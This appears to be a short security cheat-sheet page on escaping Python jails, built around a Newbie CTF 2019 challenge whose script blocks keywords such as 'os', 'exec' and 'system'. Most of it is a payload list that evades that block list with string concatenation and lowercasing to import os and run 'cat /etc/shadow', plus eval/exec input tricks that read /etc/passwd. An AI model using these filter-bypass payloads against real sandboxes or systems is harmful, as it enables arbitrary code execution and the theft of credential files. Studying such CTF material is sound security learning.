---
title: Python Jails Escape
description: 
tags:
    - Privilege Escalation
refs:
    - https://dspyt.com/how-to-python-jail-escape-newbie-ctf-2019
date: 2023-03-26
draft: false
---

If we faced the Python script as follow, we cannot use common modules used for escalating privileges (**"os", "system", etc.**).  
It appeared in **Newbie CTF 2019**.

```python
#! /usr/bin/python3
def main():
    text = input('>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("No!!!")
            return
        else:
            exec(text)

if __name__ == "__main__":
    main()
```

We need to modify module names to allow us to execute them.  
[This post](https://dspyt.com/how-to-python-jail-escape-newbie-ctf-2019) explains in details.

<br />

## Payloads

```python
print(globals())
print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow'))
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
```

<br />

## Payloads (input)

If the **"eval"** or **"exec"** modules are accepted, we can input arbitrary code.

```python
eval(input())
# or
exec(input())

> print(open("/etc/passwd", "r").read())
```
